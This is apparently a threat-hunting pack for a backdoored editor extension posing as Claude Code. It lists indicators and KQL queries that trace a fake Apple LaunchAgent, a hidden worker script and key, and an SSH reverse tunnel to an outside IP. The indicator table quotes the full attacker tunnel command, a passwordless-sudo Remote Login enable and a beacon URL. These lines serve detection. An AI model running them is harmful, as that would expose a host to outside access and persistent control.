# Hunt pack: Backdoored Claude Code Extension: From Editor to SSH Tunnel

Start from shells and network connections owned by an editor's extension host, then follow Apple-named user LaunchAgents to what launchd runs and to ssh remote forwards. Extension-host filters use endswith "Helper (Plugin)", which also matches Cursor Helper (Plugin); Windows extension hosts have no such name. Values marked "not in this capture" come from the Cursor notice, Phorion or the malware archive.

Source: https://www.threathuntinglabs.com/leads/claude-code-extension-backdoor

## Indicators

Observed in this lead's logs. Read each item's context and check your own baseline before blocking a value.

| Type | Value | Where it appeared |
| --- | --- | --- |
| File path | `~/Library/LaunchAgents/com.apple.sysmond.plist` | User LaunchAgent rewritten by Code Helper (Plugin) at 00:38:28.3236, label com.apple.sysmond, RunAtLoad and KeepAlive. Its size and hash vary with the user's home path. |
| File path | `~/.config/.smt` | Hidden shell script written by the extension host and run by launchd as /bin/sh ~/.config/.smt. Its size and hash vary with the home path. |
| File path | `~/.config/.smtk` | Private key written by openssl base64 -d -A in the worker, set to mode 600 and passed to ssh with -i. |
| SHA-256 | `7e0a52885fadee05544a9e99eb18c792bec05900a5e1a66d68f8383decb0e278` | SHA-256 of .smtk and of the earlier $TMPDIR/.stk_2f8a5cb95d from the malware archive (not in this capture). The key is embedded in the payload, so the hash is the same on every host. |
| SHA-256 | `ecb58cb29078d9646ad1dcdbe51526f2d9cfea06be5fb2ab183e8ecc3ab6bf15` | Backdoored extension.js (Cursor notice; matches the malware archive). Not in this capture. |
| SHA-256 | `fcbb327e38e61c4fec795e0d0591f52cd1014b813d20a5912104953c3a17c364` | VSIX 2.1.312 darwin-arm64 (Cursor notice). Not in this capture. |
| SHA-256 | `3de1722901165769893bef57c72594e9a54459faa23f3091b136b79966edd081` | VSIX 2.1.312 win32-x64 (Cursor notice). Not in this capture. |
| SHA-256 | `80402fdcad8799285fd93044976973ca000da7995fb93363f819bb8e4f84ee6c` | VSIX 2.1.313 darwin-arm64 (Cursor notice). Not in this capture. |
| SHA-256 | `6786ec90cbd45949695bd7805c9fbb26cfc91bc5fc897de0183d9bcb9cb21731` | VSIX 2.1.313 win32-x64 (Cursor notice). Not in this capture. |
| File path | `~/.cursor/extensions/anthropic.claude-code-2.1.312-darwin-arm64` | Installed extension folder on Apple-silicon Macs (Phorion). Check the equivalent folder for other editors and the 2.1.313 version. Not in this capture. |
| File path | `~/.ssh/authorized_keys` | Look for an ssh-ed25519 entry with comment svc-telemetry, fingerprint SHA256:0Z6R+DF64Do2nwQic8a7kkfDLNNk4IiK+2U2Rci4htk (Cursor notice). Present on this host from the earlier install, but not written in this capture. |
| File path | `$TMPDIR/.stk_<10 hex characters>` | Temporary tunnel key used before persistence starts (Cursor notice). Not written in this capture; the archive holds the earlier copy. |
| IP address | `134.209.82.225` | SSH destination for the tunnel account and the host-report target on TCP 8099. Port 22 returned no bytes; the 8099 connection carried none. |
| URL | `http://134.209.82.225:8099/beacon` | Host-report endpoint (HTTP POST, Cursor notice). This capture shows the TCP 8099 connection attempt with 0 bytes, not the request. |
| URL | `http://127.0.0.1:8099/beacon` | Loopback copy of the host report (Cursor notice). Not recorded in this capture. |
| Command line | `ssh -N -R *:0:localhost:22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ServerAliveInterval=30 -o ServerAliveCountMax=3 -o ExitOnForwardFailure=yes -o ConnectTimeout=10 -o BatchMode=yes -o IdentitiesOnly=yes -i ~/.config/.smtk tunnel@134.209.82.225` | Reverse tunnel started by the launchd worker. The server-allocated remote port (:0) forwards to the Mac's SSH service. Phorion reports autossh -M 0 when autossh is installed. |
| Command line | `/bin/sh -c systemsetup -getremotelogin 2>/dev/null` | Remote Login check run by the extension host. Administrators run this command too; correlate the parent. |
| Command line | `sudo -n systemsetup -setremotelogin on` | Runs only when Remote Login is off and passwordless sudo is available (Phorion). Not in this capture. |
| Command line | `/bin/sh -c pgrep -f '[t]unnel@134.209.82.225' 2>/dev/null` | Check for an existing tunnel, run by the extension host. The bracket stops pgrep matching its own command line. |
| Domain | `ifconfig.me` | Queried by curl from the extension host (74 bytes out, 163 back); api.ipify.org is the fallback. Both are legitimate services, so treat a lookup as a pivot only with the parent process. |
| Command line | `schtasks /create /tn SysMon` | Windows persistence, attempted as SYSTEM, with %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\sysmon.cmd as the fallback (Cursor notice). Not in this capture. |
| File path | `%USERPROFILE%\\.config\\smt.cmd` | Windows worker script, with the key at %USERPROFILE%\\.config\\smtk and a temporary key at %TEMP%\\.stk_<10 hex> (Cursor notice). Not in this capture. |
| Process | `Code Helper (Plugin)` | Microsoft-signed VS Code extension host (team ID UBF8T346G9) that ran the payload in-process as PID 2094. Its name alone does not indicate compromise. |

## Hunting queries

KQL written for this lead's tables in Threat Hunting Labs, each tested there with the result shown.
Adapt the table and field names to your own tools, then tune before using them as alerts.

### Shell commands started by an editor extension host

KQL · logs_edr_clean_CL

Lists shells started directly by the VS Code extension host. The backdoor runs its discovery and persistence commands this way. Legitimate extensions also shell out, so review each command line.

```kql
logs_edr_clean_CL
| where event_dataset == "endpoint.events.process" and event_action has "exec" and process_parent_name endswith "Helper (Plugin)" and process_name in ("sh", "bash", "zsh")
| summarize first_seen=min(timestamp) by process_pid, process_command_line
| order by first_seen asc
```

On this lead's data: Azure Log Analytics verified 2026-10-31: 7 rows from 00:38:27.987 to 00:38:29.861. Five are the backdoor (git config --global user.email, systemsetup -getremotelogin, pgrep for the tunnel, launchctl unload/load, curl ifconfig.me); which git and git --version come from VS Code's Git extension.

Tuning: Exclude which git and git --version at extension-host startup. Language servers, formatters and Git also appear on developer machines; review by command rather than suppressing the parent.

### Apple-named user LaunchAgents written by non-Apple processes

KQL · logs_edr_clean_CL

Finds launch-persistence records for com.apple.* user LaunchAgents written by a process outside Apple system paths, with the label and program each one runs.

```kql
logs_edr_clean_CL
| where event_action has "launch_daemon" and tostring(Persistence.path) contains "/Library/LaunchAgents/com.apple."
| where not(process_executable startswith "/System/" or process_executable startswith "/usr/libexec/" or process_executable startswith "/usr/sbin/" or process_executable startswith "/sbin/")
| project timestamp, process_name, process_pid, plist=tostring(Persistence.path), label=tostring(Persistence.name), program=persistence_args_text, run_at_load=tostring(Persistence.runatload), keep_alive=tostring(Persistence.keepalive)
```

On this lead's data: Azure Log Analytics verified 2026-10-31: 1 row at 00:38:28.3236 — Code Helper (Plugin) PID 2094, /Users/david-dev/Library/LaunchAgents/com.apple.sysmond.plist, label com.apple.sysmond, program /bin/sh,/Users/david-dev/.config/.smt, RunAtLoad and KeepAlive true.

Tuning: Apple writes its own agents from system paths. Review any match written by an editor, browser, script interpreter or user-writable path.

### launchd running a hidden script from ~/.config

KQL · logs_edr_clean_CL

Finds sh or bash started by launchd on a hidden file under a user's .config directory, the worker this backdoor installs.

```kql
logs_edr_clean_CL
| where event_dataset == "endpoint.events.process" and event_action has "exec" and process_parent_name == "launchd"
| where (process_command_line startswith "/bin/sh /Users/" or process_command_line startswith "/bin/bash /Users/") and process_command_line contains "/.config/."
| summarize first_seen=min(timestamp) by process_pid, process_command_line
```

On this lead's data: Azure Log Analytics verified 2026-10-31: 1 row — PID 2112, /bin/sh /Users/david-dev/.config/.smt, first seen 00:38:28.358305.

Tuning: Dotfile managers can run scripts from ~/.config through launchd; confirm which process wrote the file.

### Base64 decoding by a hidden ~/.config script

KQL · logs_edr_clean_CL

Finds openssl base64 decoding inside a shell running a hidden ~/.config script, used here to write the tunnel's private key.

```kql
logs_edr_clean_CL
| where event_dataset == "endpoint.events.process" and event_action has "exec" and process_name == "openssl" and process_command_line contains "base64 -d"
| where process_parent_command_line startswith "/bin/sh /Users/" and process_parent_command_line contains "/.config/."
| project timestamp, process_pid, process_parent_pid, process_command_line
```

On this lead's data: Azure Log Analytics verified 2026-10-31: 1 row at 00:38:28.389412 — openssl PID 2114, parent PID 2112, openssl base64 -d -A.

Tuning: openssl base64 is common in admin scripts; the parent script location narrows it.

### ssh remote forwards back to the local SSH service

KQL · logs_edr_clean_CL

Finds ssh or autossh opening a remote forward with a server-allocated port to the Mac's own sshd, which lets the server's operator reach this host.

```kql
logs_edr_clean_CL
| where event_dataset == "endpoint.events.process" and event_action has "exec" and process_name in ("ssh", "autossh")
| where process_command_line contains ":0:localhost:22" or process_command_line contains ":0:127.0.0.1:22"
| project timestamp, process_pid, process_parent_pid, process_command_line
```

On this lead's data: Azure Log Analytics verified 2026-10-31: 1 row at 00:38:28.418044 — ssh PID 2116, parent PID 2112, ssh -N -R *:0:localhost:22 … -i /Users/david-dev/.config/.smtk tunnel@134.209.82.225.

Tuning: Administrators sometimes expose a host through a jump server this way; confirm the parent and the identity file.

### ssh connections to public addresses on port 22

KQL · logs_edr_clean_CL

Shows outbound SSH from the host with byte counts, to tell an established session from one the server never answered.

```kql
logs_edr_clean_CL
| where event_dataset == "endpoint.events.network" and process_name in ("ssh", "autossh") and destination_port == 22
| where not(ipv4_is_private(destination_ip))
| project timestamp, event_action, process_pid, destination_ip, bytes_sent=tolong(otel.attributes.raw.source.bytes), bytes_received=tolong(otel.attributes.raw.destination.bytes)
| order by todatetime(timestamp) asc
```

On this lead's data: Azure Log Analytics verified 2026-10-31: 2 rows for PID 2116 to 134.209.82.225 — connection_attempted at 00:38:28.476845 and disconnect_received at 00:38:36.791252 with 22 bytes sent and 0 received.

Tuning: Developers use SSH to Git hosts and servers; baseline destinations and review new ones started by launchd-run scripts.

### Retry sleeps inside a hidden ~/.config script

KQL · logs_edr_clean_CL

Finds sleep processes whose parent runs a hidden ~/.config script, the backdoor's tunnel retry loop. End events show an older loop being killed.

```kql
logs_edr_clean_CL
| where event_dataset == "endpoint.events.process" and process_name == "sleep"
| where (process_parent_command_line startswith "/bin/sh /Users/" or process_parent_command_line startswith "/bin/bash /Users/") and process_parent_command_line contains "/.config/."
| project timestamp, event_action, process_pid, process_parent_pid, process_command_line
| order by todatetime(timestamp) asc
```

On this lead's data: Azure Log Analytics verified 2026-10-31: 2 rows — sleep 60 PID 2074 (parent 2063) ending at 00:38:28.349506, and sleep 60 PID 2127 (parent 2112) starting at 00:38:36.792484.

Tuning: Shell scripts sleep for many reasons; the hidden ~/.config parent and a fixed 60-second interval narrow it.

### Extension host connections to public IPs on non-web ports

KQL · logs_edr_clean_CL

Finds the extension host connecting straight to a public address on a port other than 80, 443 or 53, with byte counts to judge whether data moved.

```kql
logs_edr_clean_CL
| where event_dataset == "endpoint.events.network" and process_name endswith "Helper (Plugin)"
| where destination_port !in (80, 443, 53) and not(ipv4_is_private(destination_ip))
| project timestamp, process_pid, destination_ip, destination_port, bytes_sent=tolong(otel.attributes.raw.source.bytes), bytes_received=tolong(otel.attributes.raw.destination.bytes)
```

On this lead's data: Azure Log Analytics verified 2026-10-31: 1 row at 00:38:30.560986 — PID 2094 to 134.209.82.225:8099 with 0 bytes sent and 0 received.

Tuning: ipv4_is_private does not exclude 127.0.0.1, so a recorded loopback beacon would also match. Extensions that talk to self-hosted services on custom ports will match; list their destinations as exceptions.

### macOS re-reading user LaunchAgents and rewriting background items

KQL · logs_macos_clean_CL

Shows smd reading Apple-named user LaunchAgents and backgroundtaskmanagementd rewriting its background-items database after a login item changes.

```kql
logs_macos_clean_CL
| where process_name in ("smd", "backgroundtaskmanagementd")
| where (event_action == "open" and file_path contains "/LaunchAgents/com.apple.") or event_action == "xpc_connect" or (event_action == "rename" and macos_file_destination_path contains "BackgroundItems")
| project timestamp, process_name, event_action, file_path, macos_file_destination_path
| order by todatetime(timestamp) asc
```

On this lead's data: Azure Log Analytics verified 2026-10-31: 8 rows from 00:38:28.477 to 00:38:31.544 — smd opens com.apple.softwareupdated.plist and com.apple.sysmond.plist, two backgroundtaskmanagementd connections to its notifications service, and four renames into BackgroundItems-v18 database files.

Tuning: These daemons react to every login-item change. Use the timing to pivot back to the process that wrote the plist rather than alerting on them.

### Sigma alerts on the chain

KQL · logs_detection_edr_clean_CL

Summarizes the nine behavior alerts generated from the endpoint events.

```kql
logs_detection_edr_clean_CL
| summarize alerts=count(), first_alert=min(timestamp) by rule_name, severity_text
| order by first_alert asc
```

On this lead's data: Azure Log Analytics verified 2026-10-31: 9 rows, one alert each, from 00:38:28.254269 to 00:38:30.560986; four ERROR (high) and five WARN (medium).

Tuning: The rules match behavior, not this host. Expect hits from extensions that shell out or manage SSH; review by command line and parent before suppressing.

DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName in~ ("sh", "bash", "zsh")
| where InitiatingProcessFileName endswith "Helper (Plugin)"
| summarize FirstSeen=min(Timestamp)
    by DeviceId, DeviceName, ProcessId, ProcessCommandLine
| order by FirstSeen asc
